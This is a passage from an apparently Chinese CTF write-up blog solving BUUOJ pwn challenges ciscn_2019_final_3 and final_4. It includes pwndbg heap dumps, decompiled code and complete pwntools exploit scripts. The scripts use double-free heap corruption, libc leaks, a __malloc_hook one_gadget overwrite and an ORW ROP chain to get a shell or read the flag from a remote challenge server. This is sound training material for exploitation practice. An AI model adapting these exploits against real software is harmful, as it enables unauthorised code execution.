class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">........................</span><br><span class="line">........................</span><br><span class="line">0x557389972400 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x557389972410, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/16gx 0x557389972400</span><br><span class="line">0x557389972400:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x557389972410:	0x0000557389972410	0x0000000000000000</span><br><span class="line">0x557389972420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x557389972430:	0x0000000000000000	0x000000000000ebd1</span><br><span class="line">0x557389972440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x557389972450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x557389972460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x557389972470:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#code</span><br><span class="line">add(13,0x28,p64(heap-0x10))#4 </span><br><span class="line">add(14,0x28,p64(heap-0x10))#5</span><br><span class="line">add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;size</span><br><span class="line">gdb.attach(p)</span><br><span class="line">&gt;&gt;&gt;之前的输出为0x561fb56f5e60</span><br><span class="line">#GDB</span><br><span class="line">0x561fb56f5e60 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 1057, </span><br><span class="line">  fd = 0xa0a, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt;这里的size位已经被修改成了0x421为后面做准备</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#code</span><br><span class="line">free(0) #unsort_bin chunk0-&gt;fd=libc</span><br><span class="line">free(1) #tcache</span><br><span class="line">add(16,0x78,&#x27;e&#x27;)#7 </span><br><span class="line">add(17,0x18,&#x27;f&#x27;)#8  get chunk1</span><br><span class="line">gdb.attach(p)</span><br><span class="line">&gt;&gt;&gt;输出 0x55584522be60</span><br><span class="line">#GDB</span><br><span class="line">0x55584522be60 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 129, </span><br><span class="line">  fd = 0x7fbd07fc0a65, </span><br><span class="line">  bk = 0x7fbd07fca090 &lt;main_arena+1104&gt;, </span><br><span class="line">  fd_nextsize = 0x55584522be60, </span><br><span class="line">  bk_nextsize = 0x55584522be60</span><br><span class="line">&#125;</span><br><span class="line">0x55584522bee0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 929, </span><br><span class="line">  fd = 0x7fbd07fc0a66, </span><br><span class="line">  bk = 0x7fbd07fc9ca0 &lt;main_arena+96&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x81</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  0]: 0x7fbd07fc9ca0 (main_arena+96) ◂— ...</span><br><span class="line">0x30 [ -1]: 0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x55584522bee0 ◂— 0x7fbd07fc0a66</span><br><span class="line">BK: 0x55584522bee0 —▸ 0x7fbd07fc9ca0 (main_arena+96) ◂— 0x55584522bee0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">...................</span><br><span class="line">   0x55584521a000     0x55584523b000 rw-p    21000 0      [heap]</span><br><span class="line">   ..................................</span><br><span class="line">0x7fbd07bde000     0x7fbd07dc5000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;这里已经被修改为了unsorted bin，再次申请堆的话就是申请[0x562fe6debee0 PREV_INUSE]这块的bk，而且返回的地址是&gt; bk = 0x7f22f4cccca0 &lt;main_arena+96&gt;</span><br><span class="line"></span><br><span class="line">#开始计算libc base</span><br><span class="line">&gt;&gt;&gt; hex(0x7fbd07fc9ca0-0x7fbd07bde000)</span><br><span class="line">&#x27;0x3ebca0&#x27;</span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x33 bytes:</span><br><span class="line">    &#x27;OK!\n&#x27;</span><br><span class="line">    &#x27;gift :0x7fbd07fc9ca0\n&#x27;</span><br><span class="line">    &#x27;1. add\n&#x27;</span><br><span class="line">    &#x27;2. remove\n&#x27;</span><br><span class="line">    &#x27;choice &gt; &#x27;</span><br><span class="line">(&#x27;0x7fbd07bde000&#x27;, &#x27;0x7fbd07fc9c30&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="4exp-7"><a class="markdownIt-Anchor" href="#4exp-7"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_final_3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27672</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;the size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;something&quot;</span>,data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;the index&quot;</span>,<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line">heap=add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">log.info(<span class="string">&quot;chunks 0&gt; 0x%x&quot;</span>,heap)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3 </span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#5 </span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#7 </span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#9 </span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#12</span></span><br><span class="line"><span class="comment">#dup (double free)</span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))<span class="comment">#4 </span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))<span class="comment">#get chunk0-&gt;size</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#unsort_bin chunk0-&gt;fd=libc</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#tcache</span></span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,<span class="string">&#x27;e&#x27;</span>)<span class="comment">#7 </span></span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x18</span>,<span class="string">&#x27;f&#x27;</span>)<span class="comment">#8  get chunk1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">leak=add(<span class="number">18</span>,<span class="number">0x18</span>,<span class="string">&#x27;g&#x27;</span>)<span class="comment">#9   get libc</span></span><br><span class="line">libc_base =leak - <span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x10a38c</span></span><br><span class="line">log.info(<span class="string">&quot;libc base 0x%x&quot;</span>,libc_base)</span><br><span class="line">log.info(<span class="string">&quot;malloc hook 0x%x&quot;</span>,malloc_hook)</span><br><span class="line">log.info(<span class="string">&quot;one gadget 0x%x&quot;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dup</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x78</span>,p64(one_gadget))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;22&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;0;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_final_4"><a class="markdownIt-Anchor" href="#ciscn_2019_final_4"></a> ciscn_2019_final_4</h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105855306">https://blog.csdn.net/seaaseesa/article/details/105855306</a></p>
</blockquote>
<h3 id="1checksec-26"><a class="markdownIt-Anchor" href="#1checksec-26"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-25"><a class="markdownIt-Anchor" href="#2ida-25"></a> 2.IDA</h3>
<h4 id="sandbox"><a class="markdownIt-Anchor" href="#sandbox"></a> sandbox</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<h4 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> <code>delete</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please don&#x27;t patch this function!! I will check it!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index ?&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">31</span> &amp;&amp; note[idx] )</span><br><span class="line">    <span class="built_in">free</span>(note[idx]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>uaf造成double free</p>
<p>程序只能orw，存在uaf，chunk-&gt;size大小随意，<code>show</code>可以泄露</p>
<h3 id="3思路-2"><a class="markdownIt-Anchor" href="#3思路-2"></a> 3.思路</h3>
<ul>
<li>
<p>在写name的时候伪造一个chunk头</p>
</li>
<li>
<p>然后用uaf 泄露libcbase和environ</p>
</li>
<li>
<p>利用environ找到name(fake_chunk)，使用double free分配过去</p>
</li>
<li>
<p>泄露canary，扩大rsp</p>
</li>
<li>
<p>写orw的ropchain</p>
</li>
</ul>
<h3 id="4exp-8"><a class="markdownIt-Anchor" href="#4exp-8"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25021</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./ciscn_final_4&#x27;)</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./test&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">environ_s = libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xE8</span> + fake_chunk</span><br><span class="line"> </span><br><span class="line">sh.sendafter(<span class="string">&#x27;what is your name?&#x27;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content?&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x81</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x81</span>)</span><br><span class="line"><span class="comment">#heap_size数组的0x81数据用于伪造chunk的size</span></span><br><span class="line">heapsize6_addr = <span class="number">0x0000000000602058</span></span><br><span class="line">note_addr = <span class="number">0x00000000006020C0</span></span><br><span class="line"> </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">environ_addr = libc_base + environ_s</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line"><span class="comment">#add rsp, 0x148 ; ret</span></span><br><span class="line">add_rsp_148 = libc_base + <span class="number">0x00000000000353aa</span></span><br><span class="line">openat_addr = libc_base + libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;environ_addr=&#x27;</span>,<span class="built_in">hex</span>(environ_addr)</span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(heapsize6_addr - <span class="number">0x8</span>)) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#9</span></span><br><span class="line"><span class="comment">#控制notesize以及note数组</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(environ_addr) <span class="comment">#ptr0</span></span><br><span class="line">add(<span class="number">0x78</span>,payload) <span class="comment">#10</span></span><br><span class="line"><span class="comment">#泄露栈地址</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">fake_chunk_stack_addr = stack_addr - <span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_chunk_stack_addr=&#x27;</span>,<span class="built_in">hex</span>(fake_chunk_stack_addr)</span><br><span class="line"><span class="comment">#利用同样的方法分配到栈上伪造的chunk</span></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(fake_chunk_stack_addr)) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#13</span></span><br><span class="line"><span class="comment">#写栈</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x11</span>) <span class="comment">#14</span></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x11</span>)</span><br><span class="line">canary = u64(sh.recv(<span 